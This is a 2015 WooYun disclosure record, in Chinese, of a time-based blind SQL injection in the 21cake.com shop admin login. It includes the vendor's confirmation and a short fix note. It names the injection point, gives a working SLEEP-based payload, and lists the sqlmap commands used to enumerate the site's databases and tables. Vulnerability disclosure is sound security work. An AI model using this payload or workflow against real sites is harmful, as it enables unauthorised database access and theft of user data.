{"id": 46641, "wybug_id": "wooyun-2015-090015", "wybug_title": "21cake主站MySQL注入包含用户敏感信息", "wybug_corp": "21cake.com", "wybug_author": "orange", "wybug_date": "2015-01-05 08:56", "wybug_open_date": "2015-02-19 08:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-19：\t细节向公众公开  简要描述： 会送蛋糕吗(●´ϖ`●) 详细说明：  0x00 注入点\nhttp://www.21cake.com/shopadmin/index.php\n\nParameter: uname (POST)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: uname=admin' AND SLEEP(5) AND 'JMsV'='JMsV&password=admin---\n0x01 过程\n\n用burpsuite拦截到包，丢到sqlmap里面\n\n\n./sqlmap.py -r /root/log/21cake.log --dbms=mysql --dbs\n\n\n\n./sqlmap.py -r /root/log/21cake.log --dbms=mysql --table -D db_21cake\n\n\n   漏洞证明：  0x02 危害220个表。。。。偷瞄了几眼，好像很多敏感信息\n./sqlmap.py -r /root/log/21cake.log --dbms=mysql --table -D db_21cake\n\n\n\n./sqlmap.py -r /root/log/21cake.log --dbms=mysql --table -D mysql\nAdmi* ，Age**，dea***，login_us***\n\n   修复方案：  过滤，转义   版权声明：转载请注明来源 orange@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-01-05 20:07 厂商回复： 经查用户漏洞的确存在，但这里的表信息却不是公司系统里的信息，不知是否可详细说一下表信息 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-05 20:53 |    \t\torange \t\t\t( 普通白帽子  |\t\t\t        Rank:185 漏洞数:38        | 戒骄戒躁。)\t\t \n  难道是我姿势不对，漏洞详情里我只贴了mysql这个数据库的表    \n     2015-01-05 23:10 |    \t\t一个狗 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:3        | ADoG)\t\t \n  QAQ昨天懒了一下没交这个，被你交啦    \n     2015-01-05 23:15 |    \t\torange \t\t\t( 普通白帽子  |\t\t\t        Rank:185 漏洞数:38        | 戒骄戒躁。)\t\t \n  @一个狗 昨晚睡觉前随手试了一下，今天起早整理整理就提交了(●´ϖ`●)     \n     2015-01-06 10:18 |    \t\t21cake(乌云厂商)\t\t \n  还可以重现吗？取到的数据库对，表却不对，重试多次也无法重现贴图的表信息    \n     2015-01-06 12:18 |    \t\torange \t\t\t( 普通白帽子  |\t\t\t        Rank:185 漏洞数:38        | 戒骄戒躁。)\t\t \n  @21cake mysql数据库的表是猜解得到的，可能只猜解了一部分;当时贴db_21数据库的表 就不会有疑惑了；我发的私信看到了吗？    \n     2015-01-06 12:19 |    \t\torange \t\t\t( 普通白帽子  |\t\t\t        Rank:185 漏洞数:38        | 戒骄戒躁。)\t\t \n  @orange 是db_21cake    \n     2015-01-06 13:45 |    \t\t21cake(乌云厂商)\t\t \n  @实习白帽子, 收到了，回复你了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}